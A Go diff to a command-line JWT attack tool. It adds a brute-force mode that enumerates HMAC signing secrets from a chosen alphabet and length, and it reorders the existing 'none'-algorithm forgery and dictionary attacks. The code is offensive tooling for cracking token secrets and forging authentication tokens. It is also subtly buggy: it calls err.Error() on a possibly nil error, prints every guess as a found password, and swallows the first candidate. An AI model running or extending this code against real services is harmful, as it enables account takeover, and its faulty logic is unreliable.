@@ -18,12 +18,15 @@ var c = color.New(color.FgCyan)
 var m = color.New(color.FgMagenta)
 
 func main() {
-	var attackType, jwtToken, wordlist, claims string
+	var attackType, jwtToken, wordlist, claims, alphabet string
+	var passMaxLength int
 
 	flag.StringVar(&jwtToken, "jwt", "", "Set jwt token (*)")
-	flag.StringVar(&attackType, "attackType", "noneAlg", "Select attack type: noneAlg, dictionary, showJwt")
-	flag.StringVar(&wordlist, "wordlist", "", "Set dictionary path")
+	flag.StringVar(&attackType, "attackType", "showJwt", "Select attack type: noneAlg, dictionary, showJwt, bruteForce")
+	flag.StringVar(&wordlist, "wordlist", "", "Set dictionary path (?)")
 	flag.StringVar(&claims, "claims", "", "Set claims that want to update or insert (?)")
+	flag.IntVar(&passMaxLength, "passMaxLength", 4, "Set maximum character size of password for brute-force (?)")
+	flag.StringVar(&alphabet, "alphabet", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", "Set alphabet that want to usage for brute-force (?)")
 
 	flag.Parse()
 
@@ -37,13 +40,55 @@ func main() {
 		case "dictionary":
 			dictionaryAttack(jwtToken, wordlist)
 			break
-		case "showJwt":
-			showJwt(jwtToken)
-		default:
+		case "noneAlg":
 			noneAlgAttack(jwtToken,claims)
+			break
+		case "bruteForce":
+			bruteForceAttack(jwtToken, passMaxLength, alphabet)
+		default:
+			showJwt(jwtToken)
 			break
 	}
 }
+
+func bruteForceAttack(jwtToken string, passMaxLength int, alphabet string)  {
+	for secret := range generateSecret(alphabet, passMaxLength) {
+		_, _, _, valid, err := parseToken(jwtToken, secret)
+
+		fmt.Println("Password:", secret)
+
+		if (valid || err.Error() == "Token is expired") {
+			fmt.Println("Password:", secret)
+		}
+	}
+}
+
+func generateSecret(alphabet string, length int) <- chan string {
+	c := make(chan string)
+
+	go func(c chan string) {
+		defer close(c) 
+		addCharacter(c, "", alphabet, length) 
+	}(c)
+
+	fmt.Println(<-c)
+
+	return c 
+}
+
+func addCharacter(c chan string, combined string, alphabet string, length int) {
+	if length <= 0 {
+		return
+	}
+	
+	var newStr string
+	for _, ch := range alphabet {
+		newStr = combined + string(ch)
+		c <- newStr
+		addCharacter(c, newStr, alphabet, length-1)
+	}	
+}
+
 
 func noneAlgAttack(jwtToken string, claims string) {
 	_, _, _claims, _, err := parseToken(jwtToken, "")
